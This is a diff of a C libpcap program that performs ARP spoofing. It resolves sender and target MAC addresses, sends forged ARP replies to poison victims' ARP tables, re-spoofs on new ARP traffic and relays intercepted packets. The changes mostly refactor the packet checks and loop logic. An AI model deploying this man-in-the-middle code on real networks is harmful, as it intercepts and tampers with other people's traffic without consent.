@@ -7,7 +7,7 @@ int main(int argc, char **argv) {
     packet arp_packet;
     int sessioncnt;
     int arppackidx=-1;
-    int tmp = 0;
+
     uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
     uint8_t unknown[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
 
@@ -18,7 +18,7 @@ int main(int argc, char **argv) {
     session *sessionlist;
 
     uint8_t packet[1500];
-    uint8_t relay_packet[9000];
+    uint8_t relay_packet[9001];
 
     char errbuf[PCAP_ERRBUF_SIZE];
     struct pcap_pkthdr* header;
@@ -59,19 +59,16 @@ int main(int argc, char **argv) {
         sendPacket(fp,packet,sizeof(arp_packet));
 
 
-        memset(packet, 0, sizeof(packet));      //initialize packet
+        memset(packet, 0, sizeof(packet));
 
         while(true){
             int res = pcap_next_ex(fp, &header, &recv_pack);
             if(res == 0)continue;
             if (res == -1 || res == -2) break;
-            if(checkDestMAC(recv_pack, myMAC) == 1){
-                if(recv_pack[12] == 0x08 && recv_pack[13] == 0x06){
-                    if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
-                        memcpy((sessionlist+j)->targetMAC, recv_pack+22,6);               //get victim MAC addr
-                        break;
-                    }
-
+            if(checkARP(recv_pack, myIP, (sessionlist+j)->targetIP) == 2){
+                if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
+                    memcpy((sessionlist+j)->targetMAC, recv_pack+22,6);
+                    break;
                 }
             }
         }
@@ -80,21 +77,18 @@ int main(int argc, char **argv) {
         sendPacket(fp,packet,sizeof(arp_packet));
 
 
-        memset(packet, 0, sizeof(packet));      //initialize packet
+        memset(packet, 0, sizeof(packet));
 
 
         while(true){
             int res = pcap_next_ex(fp, &header, &recv_pack);
             if(res == 0)continue;
             if (res == -1 || res == -2) break;
-            if(checkDestMAC(recv_pack,myMAC) == 1){
-                if(recv_pack[12] == 0x08 && recv_pack[13] == 0x06){
-                    if(memcmp(recv_pack+14+14, (sessionlist+j)->senderIP, 4) == 0){
-                        if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
-                            memcpy((sessionlist+j)->senderMAC, recv_pack+22,6);               //get victim MAC addr
-                            break;
-                        }
-                    }
+
+            if(checkARP(recv_pack, myIP, (sessionlist+j)->senderIP) == 2){
+                if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
+                    memcpy((sessionlist+j)->senderMAC, recv_pack+22,6);
+                    break;
                 }
             }
         }
@@ -128,8 +122,9 @@ int main(int argc, char **argv) {
 
     printf("Spoofing Victim's arp table...\n");
     for(int j = 0 ; j < sessioncnt ; j++){
-        makeARPpacket(packet, (sessionlist+j)->targetMAC, myMAC, 2, myMAC, (sessionlist+j)->targetMAC, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP); //packet, DestMac, SourceMac, opcode, SenderMac, TargetMac, SenderIp, TargetIP
-        for(int j = 0 ; j < 5 ; j++){
+        //packet, DestMac, SourceMac, opcode, SenderMac, TargetMac, SenderIp, TargetIP
+        makeARPpacket(packet, (sessionlist+j)->targetMAC, myMAC, 2, myMAC, (sessionlist+j)->targetMAC, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP);
+        for(int k = 0 ; k < 5 ; k++){
             sleep(1);
             sendPacket(fp,packet,sizeof(arp_packet));
             arppackidx = j;
@@ -143,7 +138,6 @@ int main(int argc, char **argv) {
         if(res == 0) continue;
         if (res == -1 || res == -2) break;
         for(int j = 0 ; j < sessioncnt ; j++){
-
             switch(checkARP(recv_pack, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP)){
                 case 2:
                     printf("ReSpoofing session %d...\n", j+1);
@@ -152,12 +146,9 @@ int main(int argc, char **argv) {
                     }
                     sendPacket(fp,packet,sizeof(arp_packet));
                     arppackidx = j;
-                    printf("relaying...\n");
-                    tmp = 2;
                     break;
                 case 1:
-                    tmp = 1;
-                    break;
+                    continue;
                 case 0:
                     if(checkDestMAC(recv_pack,myMAC)){
                         if(checkSourceMac(recv_pack, (sessionlist+j)->targetMAC)){
@@ -172,9 +163,9 @@ int main(int argc, char **argv) {
                         }
 
                     }
-                    tmp = 0;
+                    break;
             }
-            if(tmp != 1) break;
+
         }
 
 
